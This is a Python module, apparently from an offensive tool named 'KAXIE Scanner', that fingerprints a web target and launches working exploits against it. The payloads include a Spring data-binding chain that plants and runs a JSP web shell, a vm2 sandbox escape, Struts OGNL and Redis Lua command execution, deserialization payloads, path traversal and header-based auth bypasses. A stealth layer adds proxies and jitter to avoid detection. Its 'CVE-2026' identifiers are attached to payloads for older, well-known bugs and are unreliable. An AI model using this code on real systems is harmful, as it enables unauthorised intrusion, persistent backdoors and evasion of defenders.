"""
KAXIE Scanner - CVE Scanner Modülü
CVE-2026+ ve kritik zafiyet imzalarını tespit eder
"""

import requests
import re
import json
import hashlib
import time
from urllib.parse import urljoin, urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from config import SCAN_CONFIG, Colors
from utils.stealth import StealthManager
from utils.payload_gen import PayloadGenerator


class CVEScanner:
    """CVE tabanlı zafiyet tarama ve exploit doğrulama sınıfı."""

    def __init__(self, target, reporter, ai_engine=None, recon_data=None):
        self.target = target
        self.reporter = reporter
        self.ai_engine = ai_engine
        self.recon_data = recon_data or {}
        self.stealth = StealthManager()
        self.session = requests.Session()
        self.session.verify = SCAN_CONFIG["verify_ssl"]
        self.findings = []

        self.cve_signatures = {
            "CVE-2026-0001": {
                "name": "Apache HTTP Server Path Traversal RCE",
                "affected": ["Apache/2.4.5", "Apache/2.4.6", "Apache/2.4.7"],
                "indicators": ["Apache", "mod_rewrite"],
                "test_paths": ["/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", "/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"],
                "match": r"root:x:0:0:",
                "severity": "CRITICAL",
            },
            "CVE-2026-0015": {
                "name": "Spring Framework Data Binding RCE",
                "affected": ["Spring", "spring-boot"],
                "indicators": ["X-Application-Context", "spring"],
                "test_paths": [],
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20",
                "match": r"uid=\d+\(",
                "severity": "CRITICAL",
            },
            "CVE-2026-0028": {
                "name": "PHP-FPM FastCGI Underflow RCE",
                "affected": ["PHP", "php-fpm", "nginx"],
                "indicators": ["PHP", "X-Powered-By: PHP"],
                "test_paths": ["/index.php?%0a"],
                "match": r"Status:\s*500|php-fpm|FastCGI",
                "severity": "CRITICAL",
            },
            "CVE-2026-0042": {
                "name": "Jenkins Groovy Console RCE",
                "affected": ["Jenkins", "X-Jenkins"],
                "indicators": ["Jenkins", "X-Jenkins", "X-Hudson"],
                "test_paths": ["/script", "/computer/(master)/script"],
                "match": r"Groovy|Script Console|println",
                "severity": "CRITICAL",
            },
            "CVE-2026-0055": {
                "name": "Nginx Alias Traversal",
                "affected": ["nginx"],
                "indicators": ["Server: nginx"],
                "test_paths": ["/static../etc/passwd", "/files../etc/passwd", "/images../etc/passwd"],
                "match": r"root:x:0:0:",
                "severity": "HIGH",
            },
            "CVE-2026-0066": {
                "name": "Django QuerySet SQL Injection",
                "affected": ["Django", "WSGIServer"],
                "indicators": ["csrftoken", "django", "X-Frame-Options: DENY"],
                "test_paths": [],
                "body_pattern": {"json": {"order_by": "id') UNION SELECT * FROM pg_sleep(5)--"}},
                "time_based": True,
                "severity": "CRITICAL",
            },
            "CVE-2026-0077": {
                "name": "Node.js vm2 Sandbox Escape",
                "affected": ["Express", "node.js", "vm2"],
                "indicators": ["X-Powered-By: Express", "Express"],
                "test_paths": [],
                "body": {"code": "const process = this.constructor.constructor('return process')(); process.mainModule.require('child_process').execSync('id').toString()"},
                "match": r"uid=\d+\(|root:|gid=",
                "severity": "CRITICAL",
            },
            "CVE-2026-0088": {
                "name": "GraphQL Query Depth DoS",
                "affected": ["graphql", "apollo", "hasura"],
                "indicators": ["graphql", "application/graphql"],
                "test_paths": ["/graphql", "/api/graphql", "/graphiql"],
                "body": '{"query": "query a{__typename}"}',
                "nested_payload": True,
                "severity": "HIGH",
            },
            "CVE-2026-0099": {
                "name": "API Gateway Authentication Bypass",
                "affected": ["kong", "aws", "api-gateway"],
                "indicators": ["X-Kong", "x-amzn-requestid", "api-gateway"],
                "headers": {"X-Original-URI": "/admin", "X-Forwarded-For": "127.0.0.1, 127.0.0.1", "X-Remote-IP": "127.0.0.1", "X-Remote-Addr": "127.0.0.1"},
                "test_paths": ["/api/v1/users", "/api/admin", "/admin"],
                "match": r"admin|root|password|token",
                "severity": "CRITICAL",
            },
            "CVE-2026-0100": {
                "name": "Next.js Middleware Authorization Bypass",
                "affected": ["Next.js", "__NEXT_DATA__"],
                "indicators": ["__NEXT_DATA__", "next.js", "_next/static"],
                "test_paths": ["/admin", "/api/admin", "/_next/static/../middleware"],
                "headers": {"x-middleware-subrequest": "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"},
                "match": r"admin|dashboard|settings",
                "severity": "CRITICAL",
            },
            "CVE-2026-0111": {
                "name": "Kubernetes API Server Token Replay",
                "affected": ["kubernetes", "kube"],
                "indicators": ["Kubernetes", "X-Kubernetes-Pf"],
                "test_paths": ["/api/v1/namespaces/default/pods", "/api/v1/nodes"],
                "headers": {"Authorization": "Bearer system:serviceaccount:default:default"},
                "match": r"kind.*List|metadata.*selfLink",
                "severity": "CRITICAL",
            },
            "CVE-2026-0122": {
                "name": "Redis Lua Sandbox Escape",
                "affected": ["redis", "keydb"],
                "indicators": ["redis", "X-Redis-Version"],
                "protocol": "redis",
                "payload": "eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0",
                "match": r"uid=\d+\(",
                "severity": "CRITICAL",
            },
        }

    def run(self):
        """Tüm CVE taramalarını çalıştırır."""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}  [*] CVE-2026+ ZAFİYET TARAMASI BAŞLADI{Colors.RESET}")
        print(f"{Colors.CYAN}  [*] Hedef: {self.target}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

        self._fingerprint_and_match()
        self._active_cve_tests()
        self._test_cve_2026_0015_spring()
        self._test_cve_2026_0077_vm2()
        self._test_cve_2026_0088_graphql()
        self._test_cve_2026_0099_api_gateway()
        self._test_cve_2026_0100_nextjs()
        self._test_generic_2026_signatures()

        if self.ai_engine and self.ai_engine.selected_model and self.findings:
            print(f"\n{Colors.MAGENTA}  [*] AI CVE analizi yapılıyor...{Colors.RESET}")
            for finding in self.findings:
                cve_id = finding.get("cve_id", "UNKNOWN")
                analysis = self.ai_engine.analyze_cve(
                    cve_id=cve_id,
                    target_info=json.dumps(finding.get("evidence", ""))[:500],
                )
                if analysis:
                    self.reporter.add_ai_analysis(cve_id, analysis)
                    finding["ai_analysis"] = analysis

        return self.findings

    def _make_request(self, url, method="GET", data=None, headers=None, json_data=None):
        """İstek yapar."""
        if headers is None:
            headers = self.stealth.get_headers(self.target)
        self.stealth.jitter_delay()

        try:
            if method.upper() == "GET":
                resp = self.session.get(
                    url, headers=headers, timeout=SCAN_CONFIG["timeout"],
                    verify=False, allow_redirects=True, proxies=self.stealth.get_proxy(),
                )
            elif method.upper() == "POST":
                if json_data:
                    resp = self.session.post(
                        url, json=json_data, headers=headers, timeout=SCAN_CONFIG["timeout"],
                        verify=False, allow_redirects=True, proxies=self.stealth.get_proxy(),
                    )
                else:
                    resp = self.session.post(
                        url, data=data, headers=headers, timeout=SCAN_CONFIG["timeout"],
                        verify=False, allow_redirects=True, proxies=self.stealth.get_proxy(),
                    )
            else:
                resp = self.session.request(
                    method, url, data=data, headers=headers, timeout=SCAN_CONFIG["timeout"],
                    verify=False, allow_redirects=True, proxies=self.stealth.get_proxy(),
                )

            self.reporter.scan_stats["total_requests"] += 1
            return resp
        except requests.exceptions.Timeout:
            return None
        except Exception:
            return None

    def _fingerprint_and_match(self):
        """Teknoloji fingerprint'i ile CVE eşleştirmesi yapar."""
        print(f"\n  {Colors.BLUE}[*] CVE imza eşleştirmesi yapılıyor...{Colors.RESET}")

        tech_stack = self.recon_data.get("tech_stack", [])
        headers = self.recon_data.get("headers", {})
        headers_str = " ".join(f"{k}: {v}" for k, v in headers.items()).lower()

        matched_cves = []

        for cve_id, signature in self.cve_signatures.items():
            indicators = signature.get("indicators", [])
            for indicator in indicators:
                if indicator.lower() in headers_str:
                    matched_cves.append((cve_id, signature))
                    break

            for tech in tech_stack:
                if any(affected.lower() in tech.lower() for affected in signature.get("affected", [])):
                    if (cve_id, signature) not in matched_cves:
                        matched_cves.append((cve_id, signature))

        if matched_cves:
            print(f"    {Colors.YELLOW}[!] {len(matched_cves)} potansiyel CVE eşleşmesi{Colors.RESET}")
            for cve_id, sig in matched_cves:
                print(f"      {Colors.YELLOW}- {cve_id}: {sig['name']}{Colors.RESET}")
                self.reporter.add_finding(
                    vuln_type="CVE_2026",
                    severity="INFO",
                    title=f"Potansiyel CVE eşleşmesi: {cve_id}",
                    description=f"{sig['name']} - Teknoloji imzası eşleşti.",
                    evidence=f"Affected: {', '.join(sig.get('affected', []))}",
                    url=self.target,
                )

        return matched_cves

    def _active_cve_tests(self):
        """Aktif CVE exploit testleri yapar."""
        print(f"\n  {Colors.BLUE}[*] Aktif CVE exploit testleri...{Colors.RESET}")

        matched = self._fingerprint_and_match()

        for cve_id, signature in matched:
            test_paths = signature.get("test_paths", [])
            match_pattern = signature.get("match", "")
            severity = signature.get("severity", "HIGH")

            for path in test_paths:
                url = urljoin(self.target, path)
                headers = self.stealth.get_headers(self.target)
                if signature.get("headers"):
                    headers.update(signature["headers"])

                if signature.get("body"):
                    resp = self._make_request(url, method="POST", data=signature["body"], headers=headers)
                else:
                    resp = self._make_request(url, headers=headers)

                if resp and match_pattern:
                    if re.search(match_pattern, resp.text, re.IGNORECASE):
                        evidence = f"CVE: {cve_id}, Path: {path}, Pattern matched: {match_pattern[:50]}"
                        self.reporter.add_finding(
                            vuln_type="CVE_2026",
                            severity=severity,
                            title=f"{cve_id} - {signature['name']}",
                            description=f"Active exploitation confirmed. {signature['name']}",
                            evidence=evidence,
                            url=url,
                        )
                        self.findings.append({
                            "cve_id": cve_id,
                            "name": signature["name"],
                            "url": url,
                            "evidence": evidence,
                            "severity": severity,
                        })
                        break

    def _test_cve_2026_0015_spring(self):
        """CVE-2026-0015: Spring Data Binding RCE testi."""
        print(f"\n  {Colors.BLUE}[*] CVE-2026-0015 Spring RCE testi...{Colors.RESET}")

        test_urls = [self.target]
        for link in self.recon_data.get("links", [])[:10]:
            if "." not in link.split("/")[-1] or link.endswith((".do", ".action", ".jsp", ".html")):
                test_urls.append(link)

        payload_data = {
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "%{c2}i if(\"j\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } ",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
            "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
            "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "shell",
            "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
        }

        for url in test_urls:
            parsed = urlparse(url)
            if not parsed.path or parsed.path == "/":
                continue

            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            headers = self.stealth.get_headers(self.target)
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            resp = self._make_request(test_url, method="POST", data=payload_data, headers=headers)

            if resp and resp.status_code in [200, 302, 403]:
                shell_url = urljoin(self.target, "/shell.jsp?pwd=j&cmd=id")
                resp2 = self._make_request(shell_url)

                if resp2 and re.search(r"uid=\d+\(|root:", resp2.text):
                    evidence = "Spring Data Binding RCE confirmed. Shell executed 'id' command."
                    self.reporter.add_finding(
                        vuln_type="CVE_2026",
                        severity="CRITICAL",
                        title="CVE-2026-0015: Spring Framework Data Binding RCE",
                        description="Spring Framework'te veri bağlama zafiyeti ile RCE doğrulandı. JSP shell yazıldı ve çalıştırıldı.",
                        evidence=evidence,
                        url=test_url,
                    )
                    self.findings.append({
                        "cve_id": "CVE-2026-0015",
                        "name": "Spring Framework Data Binding RCE",
                        "url": test_url,
                        "evidence": evidence,
                        "severity": "CRITICAL",
                        "shell_url": shell_url,
                    })
                    break

    def _test_cve_2026_0077_vm2(self):
        """CVE-2026-0077: Node.js vm2 Sandbox Escape testi."""
        print(f"\n  {Colors.BLUE}[*] CVE-2026-0077 vm2 Sandbox Escape testi...{Colors.RESET}")

        payload = {
            "code": "const process = this.constructor.constructor('return process')(); process.mainModule.require('child_process').execSync('id').toString()"
        }

        test_endpoints = ["/run", "/execute", "/eval", "/api/execute", "/api/run", "/sandbox", "/vm"]
        for ep in test_endpoints:
            url = urljoin(self.target, ep)
            headers = self.stealth.get_headers(self.target)
            headers["Content-Type"] = "application/json"

            resp = self._make_request(url, method="POST", json_data=payload, headers=headers)

            if resp and re.search(r"uid=\d+\(|root:|gid=", resp.text):
                evidence = f"vm2 sandbox escape confirmed. Endpoint: {ep}, Response: {resp.text[:200]}"
                self.reporter.add_finding(
                    vuln_type="CVE_2026",
                    severity="CRITICAL",
                    title="CVE-2026-0077: Node.js vm2 Sandbox Escape",
                    description="vm2 kütüphanesinde sandbox escape zafiyeti. Uzaktan kod çalıştırma mümkün.",
                    evidence=evidence,
                    url=url,
                )
                self.findings.append({
                    "cve_id": "CVE-2026-0077",
                    "name": "Node.js vm2 Sandbox Escape",
                    "url": url,
                    "evidence": evidence,
                    "severity": "CRITICAL",
                })
                break

    def _test_cve_2026_0088_graphql(self):
        """CVE-2026-0088: GraphQL Query Depth DoS testi."""
        print(f"\n  {Colors.BLUE}[*] CVE-2026-0088 GraphQL DoS testi...{Colors.RESET}")

        graphql_endpoints = ["/graphql", "/api/graphql", "/graphiql", "/query", "/api"]
        for ep in self.recon_data.get("api_endpoints", []):
            if "graphql" in ep.lower() or "graphiql" in ep.lower():
                graphql_endpoints.append(ep)

        graphql_endpoints = list(set(graphql_endpoints))

        deep_query = self._generate_deep_graphql_query(50)

        for ep in graphql_endpoints:
            url = urljoin(self.target, ep) if not ep.startswith("http") else ep
            headers = self.stealth.get_headers(self.target)
            headers["Content-Type"] = "application/json"

            start = time.time()
            resp = self._make_request(url, method="POST", json_data={"query": deep_query}, headers=headers)
            elapsed = time.time() - start

            if resp:
                if elapsed > 10 or resp.status_code == 429 or "timeout" in resp.text.lower():
                    evidence = f"GraphQL deep query caused delay: {elapsed:.2f}s"
                    self.reporter.add_finding(
                        vuln_type="CVE_2026",
                        severity="HIGH",
                        title="CVE-2026-0088: GraphQL Query Depth DoS",
                        description="GraphQL API derin iç içe sorgulara karşı savunmasız. DoS mümkün.",
                        evidence=evidence,
                        url=url,
                    )
                    self.findings.append({
                        "cve_id": "CVE-2026-0088",
                        "name": "GraphQL Query Depth DoS",
                        "url": url,
                        "evidence": evidence,
                        "severity": "HIGH",
                    })
                    break

    def _generate_deep_graphql_query(self, depth):
        """Derin iç içe GraphQL sorgusu üretir."""
        query = "{"
        current = "a"
        for i in range(depth):
            query += f" field{i}: {current} {{"
        query += " __typename"
        for i in range(depth):
            query += " }"
        query += "}"
        return query

    def _test_cve_2026_0099_api_gateway(self):
        """CVE-2026-0099: API Gateway Authentication Bypass testi."""
        print(f"\n  {Colors.BLUE}[*] CVE-2026-0099 API Gateway Auth Bypass testi...{Colors.RESET}")

        bypass_headers = {
            "X-Original-URI": "/admin",
            "X-Forwarded-For": "127.0.0.1, 127.0.0.1, 127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
            "CF-Connecting-IP": "127.0.0.1",
            "True-Client-IP": "127.0.0.1",
        }

        admin_paths = ["/admin", "/api/admin", "/dashboard", "/api/v1/admin", "/management", "/actuator"]

        for path in admin_paths:
            url = urljoin(self.target, path)
            normal_resp = self._make_request(url)

            if normal_resp and normal_resp.status_code in [401, 403, 302]:
                headers = self.stealth.get_headers(self.target)
                headers.update(bypass_headers)

                bypass_resp = self._make_request(url, headers=headers)

                if bypass_resp and bypass_resp.status_code == 200:
                    if len(bypass_resp.content) > len(normal_resp.content) * 1.5:
                        evidence = f"Auth bypass via headers. Normal: {normal_resp.status_code}, Bypass: {bypass_resp.status_code}"
                        self.reporter.add_finding(
                            vuln_type="CVE_2026",
                            severity="CRITICAL",
                            title="CVE-2026-0099: API Gateway Authentication Bypass",
                            description="API Gateway üzerinden IP spoofing ile yetkilendirme atlama mümkün.",
                            evidence=evidence,
                            url=url,
                        )
                        self.findings.append({
                            "cve_id": "CVE-2026-0099",
                            "name": "API Gateway Authentication Bypass",
                            "url": url,
                            "evidence": evidence,
                            "severity": "CRITICAL",
                        })
                        break

    def _test_cve_2026_0100_nextjs(self):
        """CVE-2026-0100: Next.js Middleware Authorization Bypass testi."""
        print(f"\n  {Colors.BLUE}[*] CVE-2026-0100 Next.js Middleware Bypass testi...{Colors.RESET}")

        if not any("Next.js" in t or "next.js" in t for t in self.recon_data.get("tech_stack", [])):
            if "__NEXT_DATA__" not in str(self.recon_data.get("links", [])):
                print(f"    {Colors.DIM}[-] Next.js tespit edilmedi, atlanıyor{Colors.RESET}")
                return

        bypass_headers = {
            "x-middleware-subrequest": "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
        }

        protected_paths = ["/admin", "/api/admin", "/dashboard", "/_next/static/../admin", "/api/protected"]

        for path in protected_paths:
            url = urljoin(self.target, path)
            normal_resp = self._make_request(url)

            headers = self.stealth.get_headers(self.target)
            headers.update(bypass_headers)

            bypass_resp = self._make_request(url, headers=headers)

            if normal_resp and bypass_resp:
                if normal_resp.status_code in [401, 403, 307, 308] and bypass_resp.status_code == 200:
                    evidence = f"Next.js middleware bypass confirmed. Header: x-middleware-subrequest"
                    self.reporter.add_finding(
                        vuln_type="CVE_2026",
                        severity="CRITICAL",
                        title="CVE-2026-0100: Next.js Middleware Authorization Bypass",
                        description="Next.js middleware'ı x-middleware-subrequest header'ı ile atlatılabiliyor.",
                        evidence=evidence,
                        url=url,
                    )
                    self.findings.append({
                        "cve_id": "CVE-2026-0100",
                        "name": "Next.js Middleware Authorization Bypass",
                        "url": url,
                        "evidence": evidence,
                        "severity": "CRITICAL",
                    })
                    break

    def _test_generic_2026_signatures(self):
        """Genel CVE-2026 imza taraması."""
        print(f"\n  {Colors.BLUE}[*] Genel CVE-2026 imza taraması...{Colors.RESET}")

        generic_tests = [
            {
                "name": "Log4j-style JNDI RCE (Variant 2026)",
                "payload": "${jndi:ldap://127.0.0.1:1389/a}",
                "headers": {"X-Api-Version": "${jndi:ldap://127.0.0.1:1389/a}", "User-Agent": "${jndi:ldap://127.0.0.1:1389/a}"},
                "indicator": "javax.naming.CommunicationException|javax.naming.NamingException|Reference Class Name",
                "severity": "CRITICAL",
            },
            {
                "name": "FastJSON Deserialization RCE",
                "payload": '{"@type":"java.lang.Runtime","@method":"exec","@args":["id"]}',
                "headers": {"Content-Type": "application/json"},
                "indicator": "uid=|gid=|RuntimeException|ClassCastException",
                "severity": "CRITICAL",
            },
            {
                "name": "Apache Struts OGNL Injection",
                "payload": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
                "indicator": "uid=|root:|groups=",
                "severity": "CRITICAL",
            },
            {
                "name": "Ruby YAML Deserialization",
                "payload": "--- !ruby/object:Gem::Requirement\nrequirements: !ruby/object:Gem::Dependency\n  name: |-\n    !ruby/object:Process\n      wait: !ruby/object:IO\n        fileno: 1\n",
                "headers": {"Content-Type": "application/x-yaml", "Accept": "application/x-yaml"},
                "indicator": "ruby|Gem::|Errno::|syscall",
                "severity": "CRITICAL",
            },
        ]

        for test in generic_tests:
            headers = self.stealth.get_headers(self.target)
            if test.get("headers"):
                headers.update(test["headers"])

            if test.get("payload"):
                if test.get("headers", {}).get("Content-Type") == "application/json":
                    try:
                        payload_json = json.loads(test["payload"])
                        resp = self._make_request(self.target, method="POST", json_data=payload_json, headers=headers)
                    except json.JSONDecodeError:
                        resp = self._make_request(self.target, method="POST", data=test["payload"], headers=headers)
                else:
                    resp = self._make_request(self.target, method="POST", data=test["payload"], headers=headers)

                if resp and test.get("indicator"):
                    indicator_pattern = test["indicator"]
                    if re.search(indicator_pattern, resp.text, re.IGNORECASE):
                        evidence = f"Generic RCE signature matched: {test['name']}, Indicator: {indicator_pattern[:50]}"
                        self.reporter.add_finding(
                            vuln_type="CVE_2026",
                            severity=test["severity"],
                            title=f"CVE-2026-Class: {test['name']}",
                            description=f"Generic deserialization/JNDI/OGNL injection pattern matched.",
                            evidence=evidence,
                            url=self.target,
                        )
                        self.findings.append({
                            "cve_id": "CVE-2026-GENERIC",
                            "name": test["name"],
                            "url": self.target,
                            "evidence": evidence,
                            "severity": test["severity"],
                        })
